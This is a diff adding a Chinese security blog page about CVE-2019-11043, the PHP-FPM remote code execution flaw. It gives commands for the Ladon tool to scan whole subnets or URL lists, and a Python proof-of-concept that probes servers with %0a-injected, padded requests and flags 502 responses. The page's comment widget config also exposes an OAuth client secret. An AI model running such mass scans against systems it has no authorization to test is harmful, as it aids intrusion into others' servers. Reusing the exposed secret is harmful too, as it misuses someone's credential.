@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Ladon,Poc,PHP,Code,Ngnix,CVE-2019-11043">
+
+
+<meta name="description" content="漏洞简介
+PHP-FPM 远程代码执行漏洞(CVE-2019-11043)
+在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Ladon POC CVE-2019-11043 PHP-FPM |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Ladon POC CVE-2019-11043 PHP-FPM">
+            
+            Ladon POC CVE-2019-11043 PHP-FPM
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Exp/">Exp</a> <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/CVE-2019-11043/" rel="tag">CVE-2019-11043</a> <a class="tag-none-link" href="/tags/Code/" rel="tag">Code</a> <a class="tag-none-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-none-link" href="/tags/Ngnix/" rel="tag">Ngnix</a> <a class="tag-none-link" href="/tags/PHP/" rel="tag">PHP</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/12/18</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1948</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="漏洞简介">漏洞简介</h3>
+<p>PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</p>
+<p>在长亭科技举办的 Real World CTF 中,国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现,向目标服务器 URL 发送 %0a 符号时,服务返回异常,疑似存在漏洞。</p>
+<p>在使用一些有错误的Nginx配置的情况下,通过恶意构造的数据包,即可让PHP-FPM执行任意代码。</p>
+<h3 id="Example">Example</h3>
+<p>和Ladon.exe放在同一目录,即可对C段或url.txt进行批量检测</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ladon CVE-2019-11043_Poc.ini 批量URL检测(根目录下放url.txt)</span><br><span class="line">Ladon 192.168.1.37/24 CVE-2019-11043_Poc.ini 批量检测C段主机是否存在该漏洞</span><br><span class="line">Ladon http://192.168.1.37:8080/index.php CVE-2019-11043_Poc.ini 指定URL</span><br><span class="line">Ladon 5.5</span><br><span class="line">By K8gege</span><br><span class="line">Call AnyExe/Command</span><br><span class="line">http://192.168.1.37:8080/index.php</span><br><span class="line">load F:\Python279\python.exe</span><br><span class="line">ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="https://raw.githubusercontent.com/k8gege/CVE-2019-11043/master/CVE-2019-11043-POC.PNG"></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># Ladon POC by k8gege</span></span><br><span class="line"><span class="comment"># VUL: CVE-2019-11043 (PHP-FPM + Ngnix)</span></span><br><span class="line"><span class="comment"># url need include .php Example：http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2019-11043_POC.ini</span></span><br><span class="line"><span class="comment"># [Ladon]</span></span><br><span class="line"><span class="comment"># exe=F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># arg=POC\CVE-2019-11043-POC.py $ip$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="comment"># Ladon 192.168.1.37/24 poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"><span class="comment"># Ladon http://192.168.1.37:8080/index.php poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Result</span></span><br><span class="line"><span class="comment"># Ladon 5.5</span></span><br><span class="line"><span class="comment"># Call AnyExe/Command</span></span><br><span class="line"><span class="comment"># http://192.168.1.37:8080/index.php</span></span><br><span class="line"><span class="comment"># load F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkpoc</span>(<span class="params">url</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		headers = {<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0"</span>}</span><br><span class="line">		res1 = requests.get(url, headers=headers)</span><br><span class="line">		<span class="keyword">if</span> res1.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">"URL: "</span>+url</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1499</span>, <span class="number">1900</span>):</span><br><span class="line">				res = requests.get(url + <span class="string">"/PHP%0Ais_poc_thistiest_lang.php?"</span> + <span class="string">"K"</span> * i, headers=headers)</span><br><span class="line">				<span class="keyword">if</span> res.status_code == <span class="number">502</span>:</span><br><span class="line">					<span class="built_in">print</span>(<span class="string">"ISVUL: CVE-2019-11043 "</span>+url)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">	  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">"http"</span> <span class="keyword">in</span> url:</span><br><span class="line">	checkpoc(url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	checkpoc(<span class="string">"http://"</span>+url+<span class="string">"/index.php"</span>)</span><br><span class="line">	checkpoc(<span class="string">"http://"</span>+url+<span class="string">":8080/index.php"</span>)</span><br><span class="line">checkpoc(<span class="string">"https://"</span>+url+<span class="string">"/index.php"</span>)</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="下载">下载</h3>
+<p>Poc: <a target="_blank" rel="noopener" href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a><br>
+Ladon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/61341.html" class="pre-post btn btn-default" title="Apache Solr <=8.2.0 Velocity Template 0day Exploit">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            Apache Solr &lt;=8.2.0 Velocity Template 0day Exploit</span>
+    </a>
+    
+    
+    <a href="/p/dc4a2cb7.html" class="next-post btn btn-default" title="Ladon for Kali 2019">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            Ladon for Kali 2019</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example"><span class="toc-text">Example</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-text">下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
